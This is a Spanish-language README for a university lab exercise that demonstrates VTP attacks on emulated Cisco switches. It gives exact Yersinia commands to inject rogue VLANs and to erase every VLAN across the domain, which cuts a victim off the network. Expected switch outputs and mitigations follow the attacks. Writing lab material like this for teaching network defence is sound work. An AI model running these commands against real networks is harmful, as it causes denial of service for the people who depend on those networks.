# VTP Attacks — Inyección y Borrado de VLANs

## Objetivo del Ataque

Manipular la base de datos de VLANs de toda una red Cisco aprovechando el protocolo **VTP (VLAN Trunking Protocol)**, logrando agregar VLANs no autorizadas o eliminar VLANs existentes provocando una pérdida total de conectividad (DoS).

## Descripción

Este laboratorio demuestra dos ataques sobre el protocolo **VTP** usando **Yersinia** como herramienta principal. Al inyectar paquetes VTP con un *Configuration Revision Number* superior al del switch servidor, los switches clientes aceptan la base de datos falsa y la propagan a todo el dominio VTP automáticamente.

Este ataque es posible gracias al acceso trunk obtenido previamente mediante **DTP VLAN Hopping** (ver repositorio `DTP Attack`).

Link al video: https://youtu.be/hRtDgXhQoho

## Topología de Red

```
               [ R1 — Gateway / DNS ]
                    (10.7.2.254)
                         |
                         | trunk
                         |
                   [ SW-1 — Core ]
                   (VTP Server)
                   (10.7.2.1)
                  /             \
         trunk  /               \  trunk
               /                 \
     [ SW-2 — Acceso ]      [ SW-3 — Distribución ]
      (VTP Client)            (VTP Client)  ← Verificación
      (10.7.2.2)              (10.7.2.3)
        |         |
  trunk |         | access VLAN 10
 (post-DTP)      |
        |         |
  [Atacante]   [Víctima]
  (10.7.2.151) (10.7.2.100)
```

## Entorno del Laboratorio

| Dispositivo | Dirección IP | Rol VTP | Función |
|---|---|---|---|
| **SW-1 (Core)** | `10.7.2.1` | Server | Origen legítimo de la DB de VLANs |
| **SW-2 (Acceso)** | `10.7.2.2` | Client | Puerto trunk del atacante (post-DTP) |
| **SW-3 (Distribución)** | `10.7.2.3` | Client | Verificación de propagación del ataque |
| **Atacante** | `10.7.2.151` | — | Inyecta paquetes VTP maliciosos |
| **Víctima** | `10.7.2.100` | — | Pierde conectividad en el Ataque B |

- **Dominio VTP:** `ITLA-SEC`
- **Password VTP:** `cisco`
- **Simulador:** PNETLab

## ¿Por qué es vulnerable?

VTP acepta cualquier paquete con un *Configuration Revision Number* mayor al actual, sin importar el origen. Una vez dentro del dominio (a través del trunk obtenido por DTP), el atacante puede enviar actualizaciones falsas que todos los switches clientes aceptarán y propagarán.

```
SW-1# show vtp status
Configuration Revision: 3    ← El atacante envía revisión 10 → los switches la aceptan
```

## Requisitos

### Pre-requisito obligatorio

- Tener acceso trunk al switch (obtenido mediante ataque DTP previo)
- Crear la subinterfaz VLAN 10 en la máquina atacante:

```bash
sudo ip link add link ens3 name ens3.10 type vlan id 10
sudo ip addr add 10.7.2.151/24 dev ens3.10
sudo ip link set dev ens3.10 up
sudo ip link set dev ens3 up
```

### Software

- **Yersinia** — ataques a protocolos de Capa 2
- Permisos de superusuario (root)

### Instalación

```bash
sudo apt update
sudo apt install yersinia -y
```

## Verificación ANTES del Ataque

Ejecuta en la consola de **SW-3** (el switch de verificación):

```
SW-3# show vtp status
```

Anota el valor de `Configuration Revision`. Tu ataque debe usar un número mayor.

```
SW-3# show vlan brief
```

Resultado esperado antes del ataque (solo VLAN 10 de operaciones):

```
VLAN  Name              Status    Ports
----  ----------------  --------  -----
1     default           active    Et0/1, Et0/2, Et0/3
10    Red_Operaciones   active    Et0/0
```

## Ataque A — Agregar una VLAN

Inyecta un paquete VTP con una VLAN nueva (ej. VLAN 666) y un Revision Number mayor al actual.

```bash
sudo yersinia vtp -attack 3 -interface ens3.10
```

El parámetro `-attack 3` agrega una VLAN al dominio.

### Verificación después del Ataque A

En **SW-3**:

```
SW-3# show vlan brief
```

La nueva VLAN debe aparecer en todos los switches del dominio sin haberla creado manualmente en ninguno de ellos:

```
VLAN  Name              Status
----  ----------------  --------
1     default           active
10    Red_Operaciones   active
15    Test              active    ← VLAN inyectada por el atacante
25    Test2             active    ← VLAN inyectada por el atacante
```

## Ataque B — Borrar todas las VLANs (DoS)

Inyecta un paquete VTP con Revision Number aún mayor pero con la lista de VLANs **completamente vacía**. Todos los switches borrarán sus bases de datos de VLANs.

```bash
sudo yersinia vtp -attack 2 -interface ens3.10
```

El parámetro `-attack 2` envía una DB de VLANs vacía con revisión superior.

### Verificación después del Ataque B

En **SW-3**:

```
SW-3# show vlan brief
```

Resultado esperado:

```
VLAN  Name              Status
----  ----------------  --------
1     default           active
```

La VLAN 10 desaparece de todos los switches. Los puertos de la víctima quedan asignados a una VLAN inexistente, perdiendo conectividad total.

### Modos de ataque disponibles en Yersinia VTP

| Número | Ataque |
|---|---|
| `0` | Sin ataque |
| `1` | Flooding de resúmenes VTP |
| `2` | Borrar todas las VLANs (DoS) |
| `3` | Agregar una VLAN |

## Flujo del Ataque B (DoS)

```
[Atacante]                    [SW-2]          [SW-1]          [SW-3]
    │                           │               │               │
    │── VTP Summary             │               │               │
    │   Revision: 20            │               │               │
    │   VLANs: (vacío) ────────▶│               │               │
    │                           │── Propaga ──▶ │               │
    │                           │               │── Propaga ──▶ │
    │                           │               │               │
    │              Todos borran VLAN 10 de su base de datos     │
    │                                                           │
    │              Víctima (VLAN 10) pierde conectividad total  │
```

## Restaurar el laboratorio

Para restablecer la VLAN 10 después del ataque, créala manualmente desde **SW-1** (VTP Server):

```
SW-1# configure terminal
SW-1(config)# vlan 10
SW-1(config-vlan)# name Red_Operaciones
SW-1(config-vlan)# exit
SW-1# write
```

Se propagará automáticamente a SW-2 y SW-3 por VTP.

## Mitigaciones

- **VTP versión 3** — requiere autenticación con contraseña MD5 en cada paquete y tiene un *primary server* que evita que clientes inyecten actualizaciones.
- **VTP modo Transparent** — el switch no acepta ni propaga actualizaciones VTP.
  ```
  SW(config)# vtp mode transparent
  ```
- **VTP modo Off** — desactiva VTP completamente.
  ```
  SW(config)# vtp mode off
  ```
- **Revision Number en 0** — antes de conectar un switch a la red, resetear su revisión:
  ```
  SW(config)# vtp mode transparent
  SW(config)# vtp mode client
  ```

## Estructura del Repositorio

```
VTP_Attacks/
└── README.md       # Esta documentación
```

## Tecnologías Utilizadas

- **Yersinia** — Ataques a protocolos de Capa 2 (DTP, VTP, STP, CDP)
- **Cisco IOS** — Switches virtualizados en PNETLab
- **PNETLab** — Plataforma de emulación de red

---

> **⚠️ AVISO IMPORTANTE**
>
> Este laboratorio fue desarrollado **exclusivamente con fines educativos** como parte de la materia **Seguridad de Redes** en el **Instituto Tecnológico de Las Américas (ITLA)**.
>
> El uso de estas técnicas en redes sin autorización explícita es **ilegal** y puede conllevar consecuencias legales severas.
>
> **Matrícula:** 2025-0702
> **Docente:** Jonathan Rondón
> **Institución:** Instituto Tecnológico de Las Américas (ITLA)
